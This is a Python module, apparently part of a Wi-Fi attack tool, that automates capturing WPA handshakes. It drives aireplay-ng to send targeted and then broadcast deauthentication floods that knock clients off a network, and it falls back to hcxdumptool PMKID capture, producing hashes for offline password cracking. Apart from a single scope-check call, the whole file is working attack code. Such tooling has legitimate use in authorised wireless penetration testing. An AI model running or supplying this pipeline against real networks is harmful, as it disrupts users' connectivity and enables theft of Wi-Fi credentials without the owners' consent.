#!/usr/bin/env python3
"""
Handshake capture module.

Three-phase pipeline:
  Phase 1: Targeted deauth  — 10 attempts × 5 packets per client
  Phase 2: Broadcast deauth — 5 attempts × 10 broadcast packets
  Phase 3: PMKID passive    — 60-second hcxdumptool capture
"""
from __future__ import annotations

import csv
import hashlib
import os
import re
import shutil
import subprocess
import tempfile
import threading
import time
from io import StringIO

from rich.console import Console
from rich.live import Live
from rich.text import Text

console = Console()


# ─────────────────────────────────────────────────────────────────────────────
# FUNCTION 1 — start_capture_process
# ─────────────────────────────────────────────────────────────────────────────

def start_capture_process(
    bssid: str,
    channel: int,
    monitor_interface: str,
    cap_prefix: str,
) -> subprocess.Popen:
    """
    Start airodump-ng in background to capture all packets.
    Returns the Popen handle — caller must terminate it.
    cap_prefix: full path prefix e.g. captures/hs_MyNet_20260610
    The actual file will be cap_prefix + "-01.cap"
    """
    cmd = [
        "airodump-ng",
        "--bssid",          bssid,
        "--channel",        str(channel),
        "--write",          cap_prefix,
        "--output-format",  "pcap",
        "--write-interval", "1",
        monitor_interface,
    ]

    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    time.sleep(2)
    console.print(f"[dim cyan]◈ Capture started → {cap_prefix}-01.cap[/]")
    return proc


# ─────────────────────────────────────────────────────────────────────────────
# FUNCTION 2 — verify_handshake
# ─────────────────────────────────────────────────────────────────────────────

def verify_handshake(cap_file: str, bssid: str) -> bool:
    """
    Check if cap_file contains a valid WPA handshake for bssid.
    Uses aircrack-ng (no wordlist) — just detection.
    Returns True if handshake found.
    """
    if not os.path.exists(cap_file):
        return False
    if os.path.getsize(cap_file) < 200:
        return False

    try:
        result = subprocess.run(
            ["aircrack-ng", "-b", bssid, cap_file],
            capture_output=True,
            text=True,
            timeout=10,
        )
        output = result.stdout + result.stderr
        if re.search(
            r"(\d+\s+handshake|WPA\s+\(\d+\s+handshake)",
            output,
            re.IGNORECASE,
        ):
            return True
        return False
    except Exception:
        return False


# ─────────────────────────────────────────────────────────────────────────────
# FUNCTION 3 — send_deauth_burst / kill_proc_safe
# ─────────────────────────────────────────────────────────────────────────────

def send_deauth_burst(
    bssid: str,
    monitor_interface: str,
    client_mac: str | None = None,
    count: int = 5,
) -> subprocess.Popen:
    """
    Send a burst of deauth packets using Popen (non-blocking).
    If client_mac is given → unicast targeted deauth.
    If client_mac is None → broadcast deauth.
    Returns the Popen handle.
    Caller does NOT need to wait for it — fire and forget.
    """
    cmd = [
        "aireplay-ng",
        "-0", str(count),
        "-a", bssid,
    ]
    if client_mac:
        cmd += ["-c", client_mac]

    cmd += ["--ignore-negative-one", monitor_interface]

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        return proc
    except FileNotFoundError:
        raise RuntimeError("aireplay-ng not found. Install aircrack-ng suite.")
    except Exception as e:
        raise RuntimeError(f"aireplay-ng failed to start: {e}")


def kill_proc_safe(proc: subprocess.Popen | None) -> None:
    """Kill a Popen process safely without raising."""
    if proc is None:
        return
    try:
        proc.kill()
        proc.wait(timeout=3)
    except Exception:
        pass


# ─────────────────────────────────────────────────────────────────────────────
# FUNCTION 4 — discover_clients
# ─────────────────────────────────────────────────────────────────────────────

def discover_clients(
    bssid: str,
    channel: int,
    monitor_interface: str,
    duration: int = 10,
) -> list[str]:
    """
    Passively scan for client MACs associated with bssid.
    Returns list of client MAC strings sorted by signal strength
    (strongest first). Empty list if none found.
    """
    tmpdir = tempfile.mkdtemp(prefix="wifidown_cl_")
    prefix = os.path.join(tmpdir, "scan")

    cmd = [
        "airodump-ng",
        "--bssid",         bssid,
        "--channel",       str(channel),
        "--write",         prefix,
        "--output-format", "csv",
        "--write-interval","2",
        monitor_interface,
    ]

    proc = subprocess.Popen(
        cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    with Live(console=console, refresh_per_second=2) as live:
        for i in range(duration, 0, -1):
            live.update(
                Text(
                    f"  ◈ Scanning for clients... {i}s",
                    style="dim cyan"
                )
            )
            time.sleep(1)

    proc.terminate()
    try:
        proc.wait(timeout=5)
    except subprocess.TimeoutExpired:
        proc.kill()

    clients = []
    csv_file = prefix + "-01.csv"

    try:
        if not os.path.exists(csv_file):
            return []

        with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()

        sections = re.split(r"\n\s*\n", content)
        client_section = None
        for s in sections:
            if "Station MAC" in s:
                client_section = s
                break

        if not client_section:
            return []

        rows = list(csv.reader(StringIO(client_section)))
        header_idx = None
        for i, row in enumerate(rows):
            if row and "Station MAC" in row[0]:
                header_idx = i
                break

        if header_idx is None:
            return []

        seen = {}
        for row in rows[header_idx + 1:]:
            row = [c.strip() for c in row]
            if len(row) < 6:
                continue
            mac = row[0].upper()
            if not re.match(r"^([0-9A-F]{2}:){5}[0-9A-F]{2}$", mac):
                continue
            assoc = row[5].strip().upper() if len(row) > 5 else ""
            if assoc and assoc != "(NOT ASSOCIATED)":
                if assoc == bssid.upper() or not assoc:
                    try:
                        power = int(row[3]) if row[3].strip() else -100
                    except ValueError:
                        power = -100
                    seen[mac] = power

        clients = sorted(seen.keys(), key=lambda m: seen[m], reverse=True)

    except Exception as e:
        console.print(f"[dim yellow]  Client parse error: {e}[/]")
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)

    return clients


# ─────────────────────────────────────────────────────────────────────────────
# FUNCTION 5 — capture_handshake (master pipeline)
# ─────────────────────────────────────────────────────────────────────────────

def capture_handshake(
    bssid: str,
    ssid: str,
    channel: int,
    monitor_interface: str,
    output_dir: str = "captures",
) -> str | None:
    """
    Master handshake capture pipeline.

    Phase 1: Targeted deauth → 10 attempts × 5 packets per client
    Phase 2: Broadcast deauth fallback → 5 attempts × 10 packets
    Phase 3: PMKID passive capture → 60 seconds

    Returns path to cap/hc22000 file on success, None on total failure.
    """
    from modules.scope import check_scope
    check_scope(bssid)

    os.makedirs(output_dir, exist_ok=True)
    timestamp   = time.strftime("%Y%m%d_%H%M%S")
    safe_ssid   = re.sub(r"[^a-zA-Z0-9_\-]", "_", ssid)[:20]
    cap_prefix  = os.path.join(output_dir, f"hs_{safe_ssid}_{timestamp}")
    cap_file    = cap_prefix + "-01.cap"

    console.print(f"\n[bold cyan]◈ Handshake Capture[/]")
    console.print(f"  Target    : [bold]{ssid}[/bold]  ({bssid})")
    console.print(f"  Channel   : {channel}")
    console.print(f"  Interface : {monitor_interface}\n")

    # ──────────────────────────────────────────────────────────
    # PHASE 1 — TARGETED DEAUTH
    # ──────────────────────────────────────────────────────────

    console.print("[bold cyan]── Phase 1: Targeted deauth ──[/]\n")

    capture_proc = start_capture_process(
        bssid, channel, monitor_interface, cap_prefix
    )

    found_event = threading.Event()

    def handshake_watcher():
        """Background thread: checks cap file every 1 second."""
        while not found_event.is_set():
            if verify_handshake(cap_file, bssid):
                found_event.set()
            time.sleep(1)

    watcher = threading.Thread(target=handshake_watcher, daemon=True)
    watcher.start()

    console.print("[dim cyan]◈ Discovering connected clients...[/]")
    clients = discover_clients(bssid, channel, monitor_interface, duration=10)

    if clients:
        console.print(
            f"[green]  ✓ Found {len(clients)} client(s): "
            f"{', '.join(clients[:3])}[/]"
        )
    else:
        console.print("[dim yellow]  No clients found.[/]")

    handshake_path = None

    if clients:
        MAX_ATTEMPTS  = 10
        PACKETS       = 5
        WAIT_SECONDS  = 3

        deauth_procs = []

        for attempt in range(1, MAX_ATTEMPTS + 1):

            if found_event.is_set():
                break

            console.print(
                f"\n[cyan]  Attempt {attempt}/{MAX_ATTEMPTS} "
                f"— sending {PACKETS} deauth packets[/]"
            )

            for p in deauth_procs:
                kill_proc_safe(p)
            deauth_procs.clear()

            p1 = send_deauth_burst(
                bssid, monitor_interface,
                client_mac=clients[0],
                count=PACKETS,
            )
            deauth_procs.append(p1)
            console.print(
                f"[dim cyan]    → {clients[0]} (primary)[/]"
            )

            if len(clients) > 1:
                p2 = send_deauth_burst(
                    bssid, monitor_interface,
                    client_mac=clients[1],
                    count=PACKETS,
                )
                deauth_procs.append(p2)
                console.print(
                    f"[dim cyan]    → {clients[1]} (secondary)[/]"
                )

            for sec in range(WAIT_SECONDS, 0, -1):
                if found_event.is_set():
                    break
                console.print(
                    f"[dim]    Watching for handshake... {sec}s[/]",
                    end="\r"
                )
                time.sleep(1)

            if found_event.is_set() or verify_handshake(cap_file, bssid):
                found_event.set()
                break

        for p in deauth_procs:
            kill_proc_safe(p)

    if found_event.is_set() or verify_handshake(cap_file, bssid):
        handshake_path = cap_file
        console.print(
            f"\n[bold green]◈ Handshake captured! (Phase 1)[/]"
        )
    else:
        console.print(
            "\n[yellow]◈ Failed to capture handshake after "
            "10 attempts.[/]"
        )

        # ──────────────────────────────────────────────────────
        # PHASE 2 — BROADCAST DEAUTH FALLBACK
        # ──────────────────────────────────────────────────────

        console.print("\n[bold cyan]── Phase 2: Broadcast deauth ──[/]\n")

        MAX_BCAST     = 5
        BCAST_PACKETS = 10
        BCAST_WAIT    = 4

        for attempt in range(1, MAX_BCAST + 1):

            if found_event.is_set():
                break

            console.print(
                f"[cyan]  Broadcast attempt {attempt}/{MAX_BCAST} "
                f"— {BCAST_PACKETS} packets[/]"
            )

            p = send_deauth_burst(
                bssid, monitor_interface,
                client_mac=None,
                count=BCAST_PACKETS,
            )

            for sec in range(BCAST_WAIT, 0, -1):
                if found_event.is_set():
                    break
                console.print(
                    f"[dim]    Watching... {sec}s[/]",
                    end="\r"
                )
                time.sleep(1)

            kill_proc_safe(p)

            if found_event.is_set() or verify_handshake(cap_file, bssid):
                found_event.set()
                break

        if found_event.is_set() or verify_handshake(cap_file, bssid):
            handshake_path = cap_file
            console.print(
                "\n[bold green]◈ Handshake captured! (Phase 2)[/]"
            )
        else:
            console.print(
                "\n[yellow]◈ Broadcast deauth also failed.[/]"
            )

    found_event.set()
    kill_proc_safe(capture_proc)

    # ──────────────────────────────────────────────────────────
    # PHASE 3 — PMKID PASSIVE (if Phases 1+2 failed)
    # ──────────────────────────────────────────────────────────

    if handshake_path is None:

        console.print(
            "\n[bold cyan]── Phase 3: PMKID passive capture ──[/]\n"
        )
        console.print(
            "[dim cyan]  Switching to PMKID capture "
            "(passive, 60 seconds)...[/]"
        )

        handshake_path = _capture_pmkid(
            bssid, monitor_interface, output_dir
        )

        if handshake_path:
            console.print(
                f"\n[bold green]◈ PMKID captured! (Phase 3)[/]"
            )
        else:
            console.print(
                "\n[bold red]◈ All capture methods exhausted. "
                "Giving up.[/]"
            )

    # ──────────────────────────────────────────────────────────
    # FINAL RESULT
    # ──────────────────────────────────────────────────────────

    if handshake_path:
        try:
            with open(handshake_path, "rb") as f:
                sha256 = hashlib.sha256(f.read()).hexdigest()
            console.print(f"  File    : [bold]{handshake_path}[/]")
            console.print(f"  SHA-256 : [dim]{sha256}[/]")
        except Exception:
            pass

    return handshake_path


def _capture_pmkid(
    bssid: str,
    monitor_interface: str,
    output_dir: str,
    duration: int = 60,
) -> str | None:
    """
    Attempt PMKID capture via hcxdumptool.
    Returns .hc22000 file path on success, None on failure.
    """
    tmpdir   = tempfile.mkdtemp(prefix="wifidown_pmkid_")
    pcapng   = os.path.join(output_dir,
                   f"pmkid_{bssid.replace(':','')}_"
                   f"{time.strftime('%Y%m%d_%H%M%S')}.pcapng")
    hc22000  = pcapng.replace(".pcapng", ".hc22000")

    filt = os.path.join(tmpdir, "filter.txt")
    with open(filt, "w") as f:
        f.write(bssid.replace(":", "").lower() + "\n")

    cmd = [
        "hcxdumptool",
        "-i",               monitor_interface,
        "-o",               pcapng,
        "--filterlist_ap="  + filt,
        "--filtermode=2",
        "--disable_deauthentication",
    ]

    try:
        proc = subprocess.Popen(
            cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
    except FileNotFoundError:
        console.print(
            "[dim yellow]  hcxdumptool not installed — "
            "skipping PMKID phase.[/]"
        )
        shutil.rmtree(tmpdir, ignore_errors=True)
        return None

    with Live(console=console, refresh_per_second=2) as live:
        for i in range(duration, 0, -1):
            live.update(
                Text(f"  ◈ PMKID sniffing... {i}s", style="dim cyan")
            )
            time.sleep(1)

    proc.terminate()
    try:
        proc.wait(timeout=5)
    except subprocess.TimeoutExpired:
        proc.kill()
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)

    if not os.path.exists(pcapng) or os.path.getsize(pcapng) < 100:
        console.print("[dim yellow]  No PMKID data captured.[/]")
        return None

    try:
        subprocess.run(
            ["hcxpcapngtool", "-o", hc22000, pcapng],
            capture_output=True, timeout=30
        )
        if os.path.exists(hc22000) and os.path.getsize(hc22000) > 0:
            return hc22000
    except Exception as e:
        console.print(f"[dim yellow]  PMKID convert error: {e}[/]")

    return None
